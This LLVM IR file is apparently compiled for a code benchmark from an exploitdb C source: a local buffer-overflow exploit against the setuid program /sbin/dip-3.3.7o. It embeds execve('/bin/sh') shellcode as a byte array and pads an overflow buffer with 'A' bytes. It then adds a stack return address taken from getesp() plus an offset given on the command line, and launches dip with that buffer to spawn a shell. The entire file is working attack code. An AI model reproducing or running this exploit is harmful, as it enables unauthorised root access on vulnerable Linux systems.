; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19077.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19077.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.code = private unnamed_addr constant [46 x i8] c"\EB\1F^\89v\081\C0\88F\07\89F\0C\B0\0B\89\F3\8DN\08\8DV\0C\CD\801\DB\89\D8@\CD\80\E8\DC\FF\FF\FF/bin/sh\00", align 16
@.str = private unnamed_addr constant [17 x i8] c"/sbin/dip-3.3.7o\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"-k\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"-l\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [5 x i8*], align 16
  %11 = alloca [4096 x i8], align 16
  %12 = alloca [46 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = bitcast [46 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([46 x i8], [46 x i8]* @__const.main.code, i32 0, i32 0), i64 46, i1 false)
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 1
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 @atoi(i8* %16)
  store i32 %17, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %18

18:                                               ; preds = %25, %2
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %19, 68
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i32, i32* %7, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %23
  store i8 65, i8* %24, align 1
  br label %25

25:                                               ; preds = %21
  %26 = load i32, i32* %7, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %7, align 4
  br label %18

28:                                               ; preds = %18
  store i32 0, i32* %8, align 4
  store i32 68, i32* %7, align 4
  br label %29

29:                                               ; preds = %41, %28
  %30 = load i32, i32* %7, align 4
  %31 = icmp slt i32 %30, 113
  br i1 %31, label %32, label %44

32:                                               ; preds = %29
  %33 = load i32, i32* %8, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %8, align 4
  %35 = sext i32 %33 to i64
  %36 = getelementptr inbounds [46 x i8], [46 x i8]* %12, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i32, i32* %7, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %39
  store i8 %37, i8* %40, align 1
  br label %41

41:                                               ; preds = %32
  %42 = load i32, i32* %7, align 4
  %43 = add nsw i32 %42, 1
  store i32 %43, i32* %7, align 4
  br label %29

44:                                               ; preds = %29
  %45 = call i32 (...) @getesp()
  %46 = load i32, i32* %6, align 4
  %47 = add nsw i32 %45, %46
  %48 = sext i32 %47 to i64
  store i64 %48, i64* %9, align 8
  %49 = load i64, i64* %9, align 8
  %50 = and i64 %49, 255
  %51 = trunc i64 %50 to i8
  %52 = load i32, i32* %7, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %53
  store i8 %51, i8* %54, align 1
  %55 = load i64, i64* %9, align 8
  %56 = lshr i64 %55, 8
  %57 = and i64 %56, 255
  %58 = trunc i64 %57 to i8
  %59 = load i32, i32* %7, align 4
  %60 = add nsw i32 %59, 1
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %61
  store i8 %58, i8* %62, align 1
  %63 = load i64, i64* %9, align 8
  %64 = lshr i64 %63, 16
  %65 = and i64 %64, 255
  %66 = trunc i64 %65 to i8
  %67 = load i32, i32* %7, align 4
  %68 = add nsw i32 %67, 2
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %69
  store i8 %66, i8* %70, align 1
  %71 = load i64, i64* %9, align 8
  %72 = lshr i64 %71, 24
  %73 = and i64 %72, 255
  %74 = trunc i64 %73 to i8
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 3
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %77
  store i8 %74, i8* %78, align 1
  %79 = load i64, i64* %9, align 8
  %80 = and i64 %79, 255
  %81 = trunc i64 %80 to i8
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %84
  store i8 %81, i8* %85, align 1
  %86 = load i64, i64* %9, align 8
  %87 = lshr i64 %86, 8
  %88 = and i64 %87, 255
  %89 = trunc i64 %88 to i8
  %90 = load i32, i32* %7, align 4
  %91 = add nsw i32 %90, 5
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %92
  store i8 %89, i8* %93, align 1
  %94 = load i64, i64* %9, align 8
  %95 = lshr i64 %94, 16
  %96 = and i64 %95, 255
  %97 = trunc i64 %96 to i8
  %98 = load i32, i32* %7, align 4
  %99 = add nsw i32 %98, 6
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %100
  store i8 %97, i8* %101, align 1
  %102 = load i64, i64* %9, align 8
  %103 = lshr i64 %102, 16
  %104 = and i64 %103, 255
  %105 = trunc i64 %104 to i8
  %106 = load i32, i32* %7, align 4
  %107 = add nsw i32 %106, 6
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %108
  store i8 %105, i8* %109, align 1
  %110 = load i64, i64* %9, align 8
  %111 = lshr i64 %110, 24
  %112 = and i64 %111, 255
  %113 = trunc i64 %112 to i8
  %114 = load i32, i32* %7, align 4
  %115 = add nsw i32 %114, 7
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %116
  store i8 %113, i8* %117, align 1
  %118 = call i8* @malloc(i32 17)
  %119 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 0
  store i8* %118, i8** %119, align 16
  %120 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 0
  %121 = load i8*, i8** %120, align 16
  %122 = call i32 @strcpy(i8* %121, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  %123 = call i8* @malloc(i32 3)
  %124 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 1
  store i8* %123, i8** %124, align 8
  %125 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 1
  %126 = load i8*, i8** %125, align 8
  %127 = call i32 @strcpy(i8* %126, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  %128 = call i8* @malloc(i32 3)
  %129 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 2
  store i8* %128, i8** %129, align 16
  %130 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 2
  %131 = load i8*, i8** %130, align 16
  %132 = call i32 @strcpy(i8* %131, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %133 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %134 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 3
  store i8* %133, i8** %134, align 8
  %135 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 4
  store i8* null, i8** %135, align 16
  %136 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 0
  %137 = load i8*, i8** %136, align 16
  %138 = getelementptr inbounds [5 x i8*], [5 x i8*]* %10, i64 0, i64 0
  %139 = call i32 @execve(i8* %137, i8** %138, i32* null)
  %140 = load i32, i32* %3, align 4
  ret i32 %140
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @getesp(...) #2

declare dso_local i8* @malloc(i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @execve(i8*, i8**, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
